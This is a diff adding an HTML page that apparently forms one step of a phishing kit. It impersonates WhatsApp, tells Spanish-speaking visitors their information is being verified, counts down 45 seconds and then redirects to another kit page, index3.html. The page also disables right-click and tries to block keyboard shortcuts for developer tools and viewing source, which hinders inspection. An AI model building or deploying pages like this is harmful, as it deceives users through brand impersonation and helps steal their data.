@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - WhatsApp</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        :root {
+            --wa-green: #25d366;
+            --wa-dark: #075e54;
+            --wa-dark-alt: #054a43;
+            --wa-bg: linear-gradient(135deg, #e0f7fa 0%, #f8f9fa 100%);
+            --wa-glass: rgba(255, 255, 255, 0.92);
+            --wa-glass-border: rgba(255, 255, 255, 0.35);
+            --wa-white: #ffffff;
+            --wa-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
+            --wa-text: #3b4a54;
+            --wa-subtitle: #5c6b77;
+            --wa-accent: #128c7e;
+            --wa-accent-light: #dcf8c6;
+            --wa-error: #ff3860;
+            --wa-transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            --wa-border-radius: 24px;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            font-family: 'Poppins', sans-serif;
+            color: var(--wa-text);
+            background: var(--wa-bg);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50vh;
+            background: linear-gradient(160deg, var(--wa-dark) 0%, var(--wa-accent) 100%);
+            z-index: -2;
+            clip-path: polygon(0 0, 100% 0, 100% 80%, 0 100%);
+        }
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.1;
+            animation: floatParticle 15s linear infinite;
+            background: radial-gradient(circle, var(--wa-green) 0%, var(--wa-accent) 100%);
+            filter: blur(1px);
+        }
+        @keyframes floatParticle {
+            0% { transform: translateY(0) translateX(0) scale(1); opacity: 0.1; }
+            50% { opacity: 0.15; }
+            100% { transform: translateY(-100vh) translateX(20px) scale(1.1); opacity: 0; }
+        }
+        .loading-container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            animation: fadeInUp 0.8s ease-out;
+        }
+        .loading-box {
+            width: 100%;
+            background: var(--wa-glass);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: var(--wa-border-radius);
+            border: 1px solid var(--wa-glass-border);
+            box-shadow: var(--wa-shadow);
+            padding: 24px;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            z-index: 10;
+            animation: slideIn 0.8s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+        .loading-box img {
+            width: 80px;
+            margin-bottom: 16px;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
+        }
+        .loading-title {
+            font-size: 1.6rem;
+            font-weight: 600;
+            color: var(--wa-text);
+            margin: 0 0 12px 0;
+        }
+        .loading-subtitle {
+            font-size: 0.95rem;
+            color: var(--wa-subtitle);
+            margin: 0 0 20px 0;
+            opacity: 0.9;
+        }
+        .progress-bar {
+            width: 90%;
+            height: 6px;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            overflow: hidden;
+            margin: 20px auto;
+            position: relative;
+        }
+        .progress-bar-inner {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--wa-green) 0%, var(--wa-accent) 100%);
+            border-radius: 12px;
+            animation: loading 45s linear forwards;
+        }
+        .counter-container {
+            font-size: 1.1rem;
+            color: var(--wa-subtitle);
+            margin: 16px 0;
+        }
+        .counter {
+            display: inline-block;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--wa-green);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            min-width: 36px;
+            text-align: center;
+        }
+        @keyframes loading {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* Responsive */
+        @media (max-width: 600px) {
+            .loading-container { max-width: 90vw; }
+            .loading-box { padding: 20px; }
+            .loading-title { font-size: 1.4rem; }
+            .loading-subtitle { font-size: 0.9rem; }
+            .loading-box img { width: 70px; }
+            .counter-container { font-size: 1rem; }
+            .counter { font-size: 1.3rem; min-width: 32px; }
+            .progress-bar { width: 95%; height: 5px; }
+        }
+        @media (max-width: 480px) {
+            .loading-container { max-width: 85vw; }
+            .loading-box { padding: 16px; }
+            .loading-title { font-size: 1.3rem; margin-bottom: 8px; }
+            .loading-subtitle { font-size: 0.85rem; margin-bottom: 16px; }
+            .loading-box img { width: 65px; margin-bottom: 10px; }
+            .counter-container { font-size: 0.95rem; }
+            .counter { font-size: 1.2rem; min-width: 28px; }
+        }
+        @media (max-width: 360px) {
+            .loading-container { max-width: 80vw; }
+            .loading-box { padding: 12px; }
+            .loading-title { font-size: 1.2rem; }
+            .loading-subtitle { font-size: 0.8rem; }
+            .loading-box img { width: 60px; }
+            .counter-container { font-size: 0.9rem; }
+            .counter { font-size: 1.1rem; min-width: 28px; }
+        }
+        @media (min-width: 1200px) {
+            .loading-container { max-width: 500px; }
+            .loading-box { padding: 32px; }
+            .loading-title { font-size: 1.8rem; }
+            .loading-subtitle { font-size: 1rem; }
+            .counter-container { font-size: 1.2rem; }
+            .counter { font-size: 1.6rem; min-width: 40px; }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12") return false;
+            if (e.ctrlKey && e.key === "u") return false;
+            if (e.ctrlKey && e.shiftKey && e.key === "I") return false;
+        });
+    </script>
+
+    <div class="particles" id="particles"></div>
+    <div class="loading-container">
+        <div class="loading-box" role="alert" aria-live="polite">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" aria-label="Logo de WhatsApp">
+            <h1 class="loading-title">Verificando tu información</h1>
+            <span class="loading-subtitle">Por favor, no cierres esta página</span>
+            <div class="progress-bar">
+                <div class="progress-bar-inner"></div>
+            </div>
+            <div class="counter-container">
+                Por favor, espera <span class="counter" id="counter" aria-label="Contador regresivo: 45">45</span> segundos
+            </div>
+        </div>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Generar partículas para el fondo
+            function createParticles() {
+                const particlesContainer = $('#particles');
+                for (let i = 0; i < 15; i++) {
+                    const size = Math.random() * 60 + 20;
+                    const posX = Math.random() * 100;
+                    const delay = Math.random() * 15;
+                    $('<div>').addClass('particle').css({
+                        width: `${size}px`,
+                        height: `${size}px`,
+                        left: `${posX}%`,
+                        top: '100vh',
+                        animationDelay: `${delay}s`
+                    }).appendTo(particlesContainer);
+                }
+            }
+            createParticles();
+
+            // Contador regresivo de 45 a 0
+            let count = 45;
+            const counterElement = document.getElementById('counter');
+            const counterContainer = document.querySelector('.counter-container');
+
+            const countdown = setInterval(() => {
+                count--;
+                counterElement.textContent = count;
+                counterElement.setAttribute('aria-label', `Contador regresivo: ${count}`);
+                if (count === 0) {
+                    clearInterval(countdown);
+                    counterContainer.style.display = 'none';
+                    window.location.href = 'index3.html';
+                }
+            }, 1000);
+
+            // Animación de entrada para el contenedor
+            $('.loading-box').hide().fadeIn(800);
+        });
+    </script>
+</body>
+</html>
